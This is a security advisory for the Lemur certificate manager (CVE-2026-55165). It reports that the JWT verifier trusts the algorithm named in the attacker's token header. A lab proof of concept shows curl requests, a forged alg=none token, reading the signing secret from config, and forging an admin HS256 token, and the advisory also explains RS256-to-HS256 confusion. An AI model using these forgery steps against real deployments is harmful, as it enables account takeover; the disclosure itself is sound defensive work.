# [M]  Lemur: JWT verifier honors attacker-supplied alg, enabling ATO

## Summary
Severity: Medium
Advisory: GHSA-r9gp-7f88-9r54
CVE: CVE-2026-55165
CWE: CWE-347
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-06-25
Source: https://github.com/advisories/GHSA-r9gp-7f88-9r54
Type: github-advisory

## Affected
- PyPI: `lemur` — affected >=0 <1.9.2

## Details
<!-- obsidian --><h1 data-heading="Lemur 1.9.0: JWT verifier trusts attacker-supplied alg from token header — defense-in-depth gap; chain-dependent ATO with secret disclosure">Lemur 1.9.0: JWT verifier trusts attacker-supplied alg from token header — defense-in-depth gap; chain-dependent ATO with secret disclosure</h1>
<h2 data-heading="Vulnerability Summary">Vulnerability Summary</h2>

Field | Value
-- | --
Title | Lemur 1.9.0: JWT verifier trusts attacker-supplied alg from token header — defense-in-depth gap; chain-dependent ATO with secret disclosure
Component | lemur/lemur/auth/service.py:130-137
CWE | CWE-347 (Improper Verification of Cryptographic Signature)
Attack Prerequisite | Defense-in-depth gap on its own — no single-request exploit against PyJWT 2.x. Single-request ATO requires a separate disclosure issue that leaks LEMUR_TOKEN_SECRET, or a future migration to asymmetric signing without fixing this sink.
Affected Versions | github.com/Netflix/lemur __version__ = "1.9.0". Same code present in every prior release that has the auth/service.py:130 block.


<h2 data-heading="Executive Summary">Executive Summary</h2>
<p>The Lemur JWT verifier reads the <code>alg</code> header field from the <em>unverified</em> token and passes it straight into <code>pyjwt.decode(..., algorithms=[header['alg']])</code>. This is a classic JWT antipattern: the server is supposed to pin the algorithm, not the attacker. PyJWT 2.x's default config rejects <code>alg=none</code>, so this is not a single-request ATO today — I want to be precise about that. The bug is a hardening gap with two real consequences. First, if the deployment ever migrates to asymmetric signing (RS256/ES256), an attacker can pin <code>alg=HS256</code> and forge tokens using the public key as the HMAC secret — the legacy "RS256→HS256 confusion" trick. Second, the audit-log surface that records <code>alg</code> to flag anomalous tokens is filled in from the attacker's header, so anomaly detection is blinded. I'm submitting this honestly at MEDIUM 4.8 (defense-in-depth) rather than inflating it; the chain to single-request ATO is documented but it depends on a separate disclosure bug.</p>
<p>Walkthrough: <a href="https://asciinema.org/a/2Blv9r4DoOleUk7a" class="external-link" target="_blank" rel="noopener nofollow">https://asciinema.org/a/2Blv9r4DoOleUk7a</a><br>
<hr>
<h2 data-heading="Description">Description</h2>
<p><code>lemur/lemur/auth/service.py:130-137</code>:</p>
<pre><code class="language-python">try:
    header_data = fetch_token_header(token)
    payload = decode_with_multiple_secrets(
        token, token_secrets, algorithms=[header_data["alg"]]
    )
except jwt.DecodeError:
    return dict(message="Token is invalid"), 403
</code></pre>
<p><code>fetch_token_header</code> decodes the JWT's first segment (base64-decoded JSON, no signature check) and returns the header object. <code>header_data["alg"]</code> is whatever the bearer of the token put there. That value is then handed to <code>decode_with_multiple_secrets</code>, which calls <code>pyjwt.decode(..., algorithms=[&#x3C;attacker_value>])</code>. The <code>algorithms</code> parameter is meant to be the server's pinned allowlist of acceptable signing algorithms — the line that says "I will accept HS256 and nothing else". By reading it from the token, Lemur asks the attacker which algorithm to trust.</p>
<p>Why this is MEDIUM and not CRITICAL today: PyJWT 2.x's <code>decode()</code> rejects <code>alg=none</code> regardless of the <code>algorithms</code> parameter (PyJWT enforces this in <code>jwt.algorithms.NoneAlgorithm.verify</code>). I confirmed this in the lab — a forged <code>alg=none</code> token comes back as <code>HTTP 403 {"error":"When alg = \"none\", key value must be None.","message":"Failed to decode token"}</code>. The classic single-request <code>alg=none</code> ATO is closed by the library, not by Lemur.</p>
<p>Why this still matters:</p>
<ol>
<li><strong>Algorithm confusion is exactly what <code>algorithms=</code> is supposed to prevent.</strong> The widely-cited "RS256→HS256 confusion" attack works by pinning <code>alg=HS256</code> and using the RS256 public key as the HMAC secret. The fix everyone teaches for that attack is "server pins the algorithm". Lemur doesn't, so the protection has a hole the moment the deployment moves to asymmetric signing.</li>
<li><strong>The PyJWT 2.x mitigation is a library default, not a Lemur design choice.</strong> A future PyJWT major that loosens the <code>none</code> check, or a downgrade to a vulnerable PyJWT for any reason, re-opens single-request ATO. Defense-in-depth means not relying on library defaults to backstop the framework's own validation.</li>
<li><strong>Audit blindness.</strong> Logging tooling that consumes <code>alg</code> to detect "this token claims an algorithm we don't issue" sees only what the attacker put in the header. A real <code>HS256</code> token forged by an attacker who pins <code>alg=ES256</code> (or any garbage that survives <code>decode</code>) bypasses naive alg-based anomaly heuristics.</li>
<li><strong>The chain to single-request ATO is short.</strong> Any separate disclosure issue that leaks <code>LEMUR_TOKEN_SECRET</code> (a debug page, an unguarded <code>/metrics</code>, an SSRF-to-config, an S3 backup leak, a git history accident) immediately turns into HS256 forgery — and the alg-from-header sink leaves the verifier downgradeable even after an operator migrates to RS256 later.</li>
</ol>
<p>I'm framing this as a hardening defect at MEDIUM 4.8 because that's what the evidence supports. The chain step (config disclosure → forge admin) is demonstrated in the lab as a clear "what happens if this chain links" walk-through, not as a primary claim.</p>
<h2 data-heading="Proof of Concept &#x26; Steps to Reproduce">Proof of Concept &#x26; Steps to Reproduce</h2>
<p>Walkthrough: <a href="https://asciinema.org/a/2Blv9r4DoOleUk7a" class="external-link" target="_blank" rel="noopener nofollow">https://asciinema.org/a/2Blv9r4DoOleUk7a</a>. Offline cast: <code>lemur_jwt_alg_hardening.cast</code>. Harness: <code>lemur_jwt_alg_hardening/support/</code> (<code>lemur_jwt_mock.py</code> mirrors <code>lemur/auth/service.py:130-137</code> line-for-line).</p>
<p><strong>Prerequisites</strong>: Docker, <code>curl</code>, <code>jq</code>, <code>python3</code> with PyJWT.</p>
<p><strong>Run</strong></p>
<pre><code class="language-bash">cd lemur_jwt_alg_hardening/
EXPLOIT_FAST=1 ./exploit_code.sh
</code></pre>
<h3 data-heading="Step 1 — Baseline legitimate login">Step 1 — Baseline legitimate login</h3>
<pre><code class="language-bash">curl -sS -X POST http://127.0.0.1:18001/api/1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"operator@netflix.example"}'
</code></pre>
<p>Response (<code>evidence/03_login_response.json</code>):</p>
<pre><code class="language-json">{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9....",
 "user":{"active":true,"email":"operator@netflix.example","id":1,"role":"operator"}}
</code></pre>
<p><code>/api/1/users/me</code> with that token returns 200 — baseline auth path works.</p>
<h3 data-heading="Step 2 — Confirm the antipattern in source">Step 2 — Confirm the antipattern in source</h3>
<pre><code class="language-bash">docker exec lemur-jwt-alg-hardening-harness cat /app/evidence-src/jwt_sink.txt
</code></pre>
<p>Output is the verbatim Lemur block:</p>
<pre><code class="language-python"># lemur/lemur/auth/service.py:130-137
try:
    header_data = fetch_token_header(token)
    payload = decode_with_multiple_secrets(
        token, token_secrets, algorithms=[header_data["alg"]]   # &#x3C;-- antipattern
    )
except jwt.DecodeError:
    return dict(message="Token is invalid"), 403
</code></pre>
<p>The mock applies the same code path. No transformation, no allowlist, no server pin.</p>
<h3 data-heading="Step 3 — Forge &#x60;alg=none&#x60; (PyJWT 2.x rejects)">Step 3 — Forge <code>alg=none</code> (PyJWT 2.x rejects)</h3>
<pre><code class="language-bash">curl -sS -o /dev/null -w 'HTTP %{http_code}
' \
  http://127.0.0.1:18001/api/1/users/me \
  -H 'Authorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAyLCAiZW1haWwiOiAiYWRtaW5AbmV0ZmxpeC5leGFtcGxlIn0.'
</code></pre>
<p>Response (<code>evidence/05_alg_none_attempt.json</code>): <code>HTTP 403</code>. Body: <code>{"error":"When alg = \"none\", key value must be None.","message":"Failed to decode token"}</code>.</p>
<p>This is honest: PyJWT 2.x closes the single-request <code>alg=none</code> path. The antipattern is not directly exploitable at this PyJWT version.</p>
<h3 data-heading="Step 4 — Chain demo: config disclosure → HS256 forgery">Step 4 — Chain demo: config disclosure → HS256 forgery</h3>
<p>The lab simulates an upstream disclosure issue by <code>docker exec</code>-ing into the container and reading <code>/app/lemur.conf.py</code>. In production this corresponds to any of: a <code>/metrics</code> page that echoes config, a debug error that prints <code>current_app.config</code>, an SSRF that reaches <code>file:///app/lemur.conf.py</code>, a misindexed git history, an S3 backup with the config file. The lab does not invent a separate vulnerability — it documents what happens <em>when one of those exists</em>.</p>
<pre><code class="language-bash">docker exec lemur-jwt-alg-hardening-harness cat /app/lemur.conf.py
# LEMUR_TOKEN_SECRET = 'lab-deploy-token-secret-DO-NOT-USE-IN-PROD-aabbccdd11'
</code></pre>
<p>Forge an admin JWT with the leaked secret:</p>
<pre><code class="language-bash">python3 -c "import jwt; print(jwt.encode({'sub':2,'email':'admin@netflix.example'}, '&#x3C;leaked>', algorithm='HS256'))"
# eyJhbGciOiJIUzI1NiIs...
</code></pre>
<p>Send it:</p>
<pre><code class="language-bash">curl -sS http://127.0.0.1:18001/api/1/users/me \
  -H "Authorization: Bearer $FORGED_ADMIN"
</code></pre>
<p>Response (<code>evidence/06_forged_admin_response.json</code>):</p>
<pre><code class="language-json">{"payload":{"email":"admin@netflix.example","sub":2},
 "user":{"active":true,"email":"admin@netflix.example","id":2,"role":"admin"}}
</code></pre>
<p>HTTP 200, <code>role=admin</code>. The forgery succeeds because (a) the attacker picked <code>alg=HS256</code>, (b) the server didn't pin its own algorithm, and (c) the secret was disclosed by the separate upstream issue. If the alg-from-header sink were fixed, even a leaked HS256 secret would not extend to whatever asymmetric algorithm the operator migrates to next — the attacker would have to also break the asymmetric key.</p>
<h3 data-heading="Step 5 — Verdict">Step 5 — Verdict</h3>
<pre><code>VERDICT: ANTIPATTERN CONFIRMED — chain-dependent ATO
1. lemur/auth/service.py:130-137 passes attacker-controlled alg into decode()
2. PyJWT 2.x rejects alg=none, so the antipattern is NOT directly exploitable
3. Chained with upstream config disclosure → HS256 forgery wins
</code></pre>

# Exploit Code & Lab Set-up

[Lemur-jwt-alg-hardening.zip](https://github.com/user-attachments/files/28317909/Lemur-jwt-alg-hardening.zip)


<h2 data-heading="Root Cause Analysis">Root Cause Analysis</h2>
<p>The pattern in <code>auth/service.py:130-137</code> is what every JWT-library author warns against. <code>pyjwt.decode</code>'s <code>algorithms</code> parameter exists precisely to pin the server's accepted set; the documentation calls out that callers should never pass the value from the token header. The author of this block likely intended to support multiple deployment configurations (some on HS256, some on RS256) and dispatched on the token's claimed algorithm — but the right way to do that is <code>algorithms=current_app.config["JWT_ACCEPTED_ALGS"]</code> (a server-pinned list), not <code>algorithms=[header_data["alg"]]</code> (the attacker's preference).</p>
<p>The PyJWT 2.x mitigation is the only thing standing between this code and a single-request <code>alg=none</code> ATO. That mitigation lives in PyJWT's <code>NoneAlgorithm.verify</code>, which raises <code>InvalidKeyError</code> when <code>alg=none</code> is supplied with a non-None key. Lemur passes a real key, so the path raises and Lemur catches it as <code>jwt.DecodeError</code> and returns 403. Good — but the protection is in the dependency, not in Lemur's code. A PyJWT-1.x backport, an accidental downgrade, or a future PyJWT behaviour change re-opens the door.</p>
<p>The RS256→HS256 confusion variant is the more durable concern. If an operator migrates Lemur from HS256 to RS256 — a normal hardening step — the attacker pins <code>alg=HS256</code> in the header and uses the RS256 <em>public key</em> as the HMAC secret. PyJWT 2.x's <code>decode_complete</code> does call <code>_verify_signature</code> with the supplied algorithm, and if the algorithm is HS256 and the "secret" is the bytes of the RS256 public key, the verifier passes. The fix is a server-pinned algorithm list; if the server only accepts <code>["RS256"]</code>, an attacker-supplied <code>alg=HS256</code> token fails at the <code>algorithms</code> check before any key material is consulted.</p>
<p>The MEDIUM 4.8 score honestly reflects what's exploitable today: the antipattern is real, the impact today is limited to (a) audit-log blinding and (b) a downgrade primitive that activates under separate conditions. I'm explicitly not claiming RS256→HS256 against current Lemur because Lemur today is HS256 — the "RS256 → HS256" trick doesn't apply because Lemur's secret arg is HMAC bytes, not an RSA pubkey. The fix is still worth making.</p>

<h2 data-heading="Attack Scenario">Attack Scenario</h2>

```mermaid
sequenceDiagram
    participant Attacker
    participant Lemur as Lemur API
    participant Disclosure as Disclosure surface
    participant Audit as Audit logging

    Note over Attacker,Lemur: "Today: PyJWT 2.x mitigation holds for alg=none"
    Attacker->>Lemur: "Bearer alg=none token with [payload]"
    Lemur->>Lemur: "pyjwt.decode raises (alg=none + non-None key)"
    Lemur-->>Attacker: "403 Forbidden"

    Note over Disclosure,Lemur: "Chain step: separate disclosure leaks LEMUR_TOKEN_SECRET"
    Attacker->>Disclosure: "trigger debug / SSRF / backup leak"
    Disclosure-->>Attacker: "LEMUR_TOKEN_SECRET value"

    Note over Attacker,Lemur: "Forge HS256 admin token with leaked secret"
    Attacker->>Lemur: "Bearer alg=HS256 admin token signed with leaked secret"
    Lemur->>Lemur: "algorithms=[HS256] (taken from header) — accepted"
    Lemur-->>Attacker: "200 OK, role=admin"

    Note over Audit: "alg=HS256 in audit log - no anomaly flag because attacker picks alg"
```

<h2 data-heading="Impact Assessment">Impact Assessment</h2>
<p>Today, in a fully-patched Lemur 1.9.0 on PyJWT 2.x, the standalone impact is C:L (audit-log surface is attacker-influenced) / I:L (an attacker who controls <code>alg</code> can downgrade a future verifier upgrade) / A:N. The vector requires no user interaction — the attacker just sends a crafted token directly — but AC:H reflects the real-world conditions that have to align (PyJWT version, future migration to asymmetric signing, or a separate disclosure issue) before standalone impact materializes. That's the 4.8 MEDIUM score. The chain step to single-request ATO depends on a separate disclosure issue, which I'm not claiming as part of this report.</p>
<p>The reason this is worth fixing now rather than later is that it's a one-line change with no behavioural risk, and the consequence of leaving it in place is a permanent downgrade vector against any algorithm migration Netflix later decides to do. Lemur's role in the certificate-signing pipeline makes its session tokens unusually high-value — anyone who forges a Lemur admin JWT can issue, revoke, and exfiltrate certificates across the org. The Lemur PKI compromise report submitted separately (ACME <code>acme_url</code> SSRF + creator IDOR) shows what an admin Lemur identity can do in practice.</p>
<p>If Lemur ever moves to asymmetric signing without fixing this sink, the score moves to CRITICAL on the same day. Fix it now.</p>
<h2 data-heading="Remediation">Remediation</h2>
<p>One-line server pin:</p>
<pre><code class="language-python"># lemur/lemur/auth/service.py:130-137
allowed_algs = current_app.config.get("JWT_ALGORITHMS", ["HS256"])
try:
    payload = decode_with_multiple_secrets(
        token, token_secrets, algorithms=allowed_algs
    )
except jwt.DecodeError:
    return dict(message="Token is invalid"), 403
</code></pre>
<p>Three follow-ups worth doing at the same time:</p>
<ol>
<li><strong>Log the algorithm the server actually applied, separately from the algorithm in the token header.</strong> This lets audit tooling see "the server enforced HS256 and the token claimed HS256" or, post-fix, "the server enforced RS256 and the token claimed HS256 — rejected", and flag mismatches.</li>
<li><strong>Pin <code>algorithms</code> to the smallest possible set.</strong> If Lemur only ever issues HS256, accept only HS256. Don't list every supported algorithm just because the library supports it.</li>
<li><strong>Migrate to asymmetric signing in a separate hardening PR</strong> once the algorithm pin is in. RS256 with key rotation removes the "leaked secret = forge admin" chain entirely.</li>
</ol>

## References
- https://github.com/Netflix/lemur/security/advisories/GHSA-r9gp-7f88-9r54
- https://github.com/Netflix/lemur
- https://github.com/Netflix/lemur/releases/tag/v1.9.2
